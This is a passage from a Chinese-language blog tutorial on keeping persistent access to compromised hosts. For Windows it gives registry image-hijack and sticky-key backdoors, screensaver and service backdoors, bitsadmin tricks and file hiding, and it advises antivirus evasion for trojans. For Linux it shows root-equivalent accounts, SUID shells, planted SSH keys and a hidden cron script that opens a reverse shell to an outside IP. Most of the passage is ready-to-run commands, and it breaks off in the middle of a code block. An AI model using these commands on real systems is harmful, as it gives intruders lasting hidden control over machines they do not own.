+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">HKEY_LOCAL_MACHINE</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Image</span><span class="w"> </span><span class="n">File</span><span class="w"> </span><span class="n">Execution</span><span class="w"> </span><span class="n">Options</span><span class="err">\</span><span class="n">svchost</span><span class="p">.</span><span class="na">exe</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><font style="color:rgb(77, 77, 77);">在此注册表位置添加项sethc.exe，添加debugger键的值为c:\windows\system32\cmd.exe</font></strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/16.png"
+	width="1711"
+	height="1012"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/16_hu_6bf049b51fe5af30.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/16_hu_50c07fcc43a06021.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="169"
+		data-flex-basis="405px"
+	
+></p>
+<p><strong>连续按5次Shift即可打开CMD，本质上和粘滞键后门没啥区别</strong></p>
+<h2 id="17屏幕保护后门"><strong>1.7.屏幕保护后门</strong>
+</h2><p><strong><font style="color:rgb(77, 77, 77);">屏幕保护是Windows功能的一部分，使用户可以在一段时间不活动后放置屏幕消息或图形动画。Windows的此功能被威胁参与者滥用为持久性方法。这是因为屏幕保护程序是具有.scr文件扩展名的可执行文件，并通过scrnsave.scr实用程序执行。</font></strong></p>
+<p><strong><font style="color:rgb(77, 77, 77);">注册表位置：HKEY_CURRENT_USER\Control Panel\Desktop</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">SCRNSAVE</span><span class="p">.</span><span class="na">EXE为默认的屏保程序</span><span class="err">，</span><span class="n">我们可将此键值设置为我们要利用的恶意程序</span><span class="err">。</span><span class="n">在本质上</span><span class="err">，</span><span class="p">.</span><span class="na">scr文件是可执行文件</span><span class="err">。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ScreenSaveActive表示屏保状态</span><span class="err">，</span><span class="n">1为启动</span><span class="err">，</span><span class="n">0为关闭</span><span class="err">。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ScreenSaverTimeout表示屏幕保护程序启动前系统的空闲事件</span><span class="err">，</span><span class="n">单位为秒</span><span class="err">，</span><span class="n">默认为900</span><span class="p">(</span><span class="n">15分钟</span><span class="p">)</span><span class="err">。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ScreenSaverIsSecure默认参数为0</span><span class="err">，</span><span class="n">标识不需要密码即可解锁</span><span class="err">。</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>如果你的注册表不存在这几个字段可以自己添加，如下图所示</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/17.png"
+	width="1601"
+	height="747"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/17_hu_c2c2028649a40557.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/17_hu_329e1a25bf78fd09.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="214"
+		data-flex-basis="514px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">reg</span><span class="w"> </span><span class="n">add</span><span class="w"> </span><span class="err">“</span><span class="n">HKEY_CURRENT_USER</span><span class="err">\</span><span class="n">Control</span><span class="w"> </span><span class="n">Panel</span><span class="err">\</span><span class="n">Desktop</span><span class="err">”</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">SCRNSAVE</span><span class="p">.</span><span class="na">EXE</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_SZ</span><span class="w"> </span><span class="o">/</span><span class="n">d</span><span class="w"> </span><span class="err">“</span><span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="n">shell</span><span class="p">.</span><span class="na">exe</span><span class="err">”</span><span class="w"> </span><span class="o">/</span><span class="n">f</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="18服务自启动后门">1.8.服务自启动后门
+</h2><p><strong><font style="color:rgb(77, 77, 77);">自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务。</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sc</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">binpath</span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="n">666</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="err">（</span><span class="n">注意等号后面有空格</span><span class="err">）#</span><span class="n">创建服务</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sc</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">start</span><span class="o">=</span><span class="w"> </span><span class="n">auto</span><span class="w"> </span><span class="err">#</span><span class="n">设置服务为自动启动</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">net</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="err">#</span><span class="n">启动服务</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sc</span><span class="w"> </span><span class="n">delete</span><span class="w"> </span><span class="n">test</span><span class="w">            </span><span class="c1">//删除服务</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sc</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">test</span><span class="w">             </span><span class="c1">//查询服务</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/18.png"
+	width="1070"
+	height="368"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/18_hu_6e952ca82f363dbe.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/18_hu_6756b20dcf29df7f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="290"
+		data-flex-basis="697px"
+	
+></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/19.png"
+	width="2065"
+	height="633"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/19_hu_733fd9750700fee4.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/19_hu_bee98a166a977728.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="326"
+		data-flex-basis="782px"
+	
+></p>
+<h2 id="19bitsadmin">1.9.bitsadmin
+</h2><p><strong><font style="color:rgb(77, 77, 77);">BITS (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">bitsadmin</span><span class="w"> </span><span class="o">/</span><span class="n">create</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="c1">//创建任务test</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">bitsadmin</span><span class="w"> </span><span class="o">/</span><span class="n">addfile</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="n">windows</span><span class="err">\</span><span class="n">system32</span><span class="err">\</span><span class="n">calc</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">ndsec</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">calc</span><span class="p">.</span><span class="na">exe</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">bitsadmin</span><span class="w"> </span><span class="o">/</span><span class="n">SetNotifyCmdLine</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="err">“</span><span class="n">cmd</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">/</span><span class="n">c</span><span class="w"> </span><span class="n">calc</span><span class="p">.</span><span class="na">exe</span><span class="err">”</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">bitsadmin</span><span class="w"> </span><span class="o">/</span><span class="n">resume</span><span class="w"> </span><span class="n">test</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="110windows的隐藏文件">1.10.Windows的隐藏文件
+</h2><p><strong>everything是可以搜出来的，如果是木马文件需要做免杀，不然会被杀软识别出</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">隐藏文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">attrib</span><span class="w"> </span><span class="o">+</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="n">a</span><span class="w"> </span><span class="o">+</span><span class="n">h</span><span class="w"> </span><span class="o">+</span><span class="n">r</span><span class="w"> </span><span class="o">/</span><span class="n">文件路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">恢复隐藏</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">attrib</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">/</span><span class="n">文件路径</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>不管是使用命令行还是直接看都是不能直接发现该文件的，但是假设你创建了一个同名文件系统还是会提示你文件名相同的，everything还是可以发现的</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/20.png"
+	width="1553"
+	height="708"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/20_hu_e3f66257da3d08c0.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/20_hu_a73510e59439431e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="526px"
+	
+></p>
+<p><strong>如果是病毒文件的话，文件做好免杀，杀毒工具扫不出来，加上隐藏该文件，还是能实现较好的权限维持的，该方法对于文件落地的后门提供保护</strong></p>
+<h2 id="111windows权限维持小结"><strong>1.11.Windows权限维持小结</strong>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Windows权限维持方法有</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">1</span><span class="p">.</span><span class="na">影子账户</span><span class="w"> </span><span class="n">2</span><span class="p">.</span><span class="na">注册表写后门</span><span class="w"> </span><span class="n">3</span><span class="p">.</span><span class="na">计划任务后门</span><span class="w"> </span><span class="n">4</span><span class="p">.</span><span class="na">粘滞键后门</span><span class="w"> </span><span class="n">5</span><span class="p">.</span><span class="na">映像劫持</span><span class="w"> </span><span class="n">6</span><span class="p">.</span><span class="na">屏幕保护后门</span><span class="w"> </span><span class="n">7</span><span class="p">.</span><span class="na">服务自启动后门</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">8</span><span class="p">.</span><span class="na">bitsadmin</span><span class="w"> </span><span class="n">9</span><span class="p">.</span><span class="na">黄金票据</span><span class="o">&amp;</span><span class="n">白银票据</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">各权限维持优缺点</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">1</span><span class="p">.</span><span class="na">影子账户</span><span class="err">：</span><span class="n">比较麻烦</span><span class="err">，</span><span class="n">也容易被发现</span><span class="err">，</span><span class="n">查注册表即可</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2</span><span class="p">.</span><span class="na">注册表写后门</span><span class="err">：</span><span class="n">比较简单</span><span class="err">，</span><span class="n">但也容易被发现</span><span class="err">，</span><span class="n">外联</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">3</span><span class="p">.</span><span class="na">计划任务后门</span><span class="err">：</span><span class="n">和注册表一样</span><span class="err">，</span><span class="n">都有外联</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">4</span><span class="p">.</span><span class="na">粘滞键后门</span><span class="o">/</span><span class="n">映像劫持</span><span class="err">：</span><span class="n">也容易被发现</span><span class="err">：</span><span class="n">按5下shift</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">5</span><span class="p">.</span><span class="na">屏幕保护后门</span><span class="err">：</span><span class="n">不易实现</span><span class="err">，</span><span class="n">目标服务器不一定会进入息屏页面</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">6</span><span class="p">.</span><span class="na">服务自启动后门</span><span class="err">：</span><span class="n">容易被发现</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">7</span><span class="p">.</span><span class="na">黄金票据</span><span class="o">&amp;</span><span class="n">白银票据</span><span class="err">：</span><span class="n">域控都拿下了</span><span class="err">，</span><span class="n">也没必要再创建后门</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="2linux权限维持">2.Linux权限维持
+</h1><p><a class="link" href="https://mp.weixin.qq.com/s/PGNMz9xx3917JjbeGqkVZg"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/PGNMz9xx3917JjbeGqkVZg</a></p>
+<p><a class="link" href="https://github.com/RuoJi6/HackerPermKeeper"  target="_blank" rel="noopener"
+    >https://github.com/RuoJi6/HackerPermKeeper</a>           Linux权限维持工具</p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/21.png"
+	width="878"
+	height="1109"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/21_hu_55d5ee87368afbee.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/21_hu_1a465fd70abfdcca.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="79"
+		data-flex-basis="190px"
+	
+></p>
+<h2 id="21添加账号">2.1.添加账号
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">添加账号test1</span><span class="err">，</span><span class="n">设置uid为0</span><span class="err">，</span><span class="n">密码为123456</span><span class="p">,</span><span class="n">第一次设置密码可能会通过不了</span><span class="err">，</span><span class="n">可以设置完后进行修改</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">useradd</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="err">&#39;</span><span class="n">openssl</span><span class="w"> </span><span class="n">passwd</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="w"> </span><span class="o">-</span><span class="n">salt</span><span class="w"> </span><span class="err">&#39;</span><span class="n">salt</span><span class="err">&#39;</span><span class="w"> </span><span class="n">123456</span><span class="err">&#39;</span><span class="w"> </span><span class="n">test1</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">-</span><span class="n">g</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">G</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">test1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;test1:x:0:0::/:/bin/sh&#34;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">          
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">增加超级用户账号</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">passwd</span><span class="w"> </span><span class="n">test2</span><span class="w">                           
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">修改test2的密码为123456</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="22suid-shell">2.2.SUID Shell
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">SUID</span><span class="w"> </span><span class="n">Shell是一种可用于以拥有者权限运行的shell</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cp</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chmod</span><span class="w"> </span><span class="n">u</span><span class="o">+</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w">           </span><span class="n">普通用户运行即可拿到root权限</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/22.png"
+	width="1244"
+	height="643"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/22_hu_76ff19a762b4ceab.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/22_hu_b02ed567c65b46e6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="193"
+		data-flex-basis="464px"
+	
+></p>
+<h2 id="23ssh公私钥登录">2.3.ssh公私钥登录
+</h2><p><strong>攻击机Kali生成公钥</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="n">rsa</span><span class="w"> </span><span class="err">#</span><span class="n">三次回车</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id_rsa</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">私钥</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id_rsa</span><span class="p">.</span><span class="na">pub</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">公钥</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/23.png"
+	width="1494"
+	height="873"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/23_hu_ebea5c9e47c5d5ac.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/23_hu_99e690f567e1df30.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="171"
+		data-flex-basis="410px"
+	
+></p>
+<p><strong><font style="color:rgb(77, 77, 77);">把这个文件复制到受控主机.ssh目录下的authorized_keys，这个目录都在用户的家目录里面</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">将Kali生成的SSH公钥内容复制到受害主机authorized_keys的内容</span><span class="err">，</span><span class="n">并替换</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">然后不需要密码直接可以连接</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/24.png"
+	width="1799"
+	height="862"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/24_hu_78ca3fdf5e4022d5.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/24_hu_365bee012b0f478c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="208"
+		data-flex-basis="500px"
+	
+></p>
+<h2 id="24定时任务crontab">2.4.定时任务Crontab
+</h2><p><strong>利用系统的定时任务功能反弹shell</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">vim</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="p">.</span><span class="na">back</span><span class="p">.</span><span class="na">sh</span><span class="w">              </span><span class="c1">//创建后门文件，这里可以创建成隐藏文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="o">!/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">114</span><span class="p">.</span><span class="na">116</span><span class="p">.</span><span class="na">233</span><span class="p">.</span><span class="na">221</span><span class="o">/</span><span class="n">3333</span><span class="w"> </span><span class="n">0</span><span class="o">&gt;&amp;</span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chmod</span><span class="w"> </span><span class="n">777</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="p">.</span><span class="na">back</span><span class="p">.</span><span class="na">sh</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/25.png"
+	width="1322"
+	height="273"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/25_hu_a7979443f1933112.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/25_hu_c63b23fd987d6402.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="484"
+		data-flex-basis="1162px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
